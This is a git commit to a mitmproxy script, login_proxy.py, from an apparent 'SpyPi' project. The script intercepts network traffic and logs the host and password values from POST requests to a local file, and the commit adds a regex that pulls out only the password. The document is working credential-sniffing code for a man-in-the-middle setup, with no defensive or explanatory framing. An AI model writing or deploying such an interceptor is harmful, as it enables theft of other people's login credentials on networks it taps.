7e0024878352ba544a8b40d2c8b5741aedf05a70
Lukas_Skywalker <lukas.diener@hotmail.com>
2017-10-11 15:24:59 +0200

    Add regex for parsing password url parameter

--- Code/login_proxy.py
+++ Code/login_proxy.py
@@ -1,19 +1,22 @@
 # Sarah M. - 2017
 
+import re
 import sys
 import datetime
 from colors import farben
+
 
 def request(flow):
     now = datetime.datetime.now()
     content = flow.request.get_text()
     host = flow.request.pretty_host
     method = flow.request.method
-    if method == "POST" and ("pass" in content) or ("password" in content) :
-        with open ("/home/pi/SpyPi/Code/proxy.txt", "a") as myfile:
-            myfile.write(farben.AUF + str(now) +" // " + farben.END)
+    if method == "POST" and ("pass" in content) or ("password" in content):
+        with open("/home/pi/SpyPi/Code/proxy.txt", "a") as myfile:
+            myfile.write(farben.AUF + str(now) + " // " + farben.END)
             myfile.write(farben.LD + host + farben.END)
             myfile.write("\n")
-            myfile.write(farben.IN + content + farben.END)
+            passwords = re.findall(r"(?:pass|password)=([^&]*)", content)
+            myfile.write(farben.IN + passwords[0] + farben.END)
             myfile.write("\n")
             myfile.write("\n")
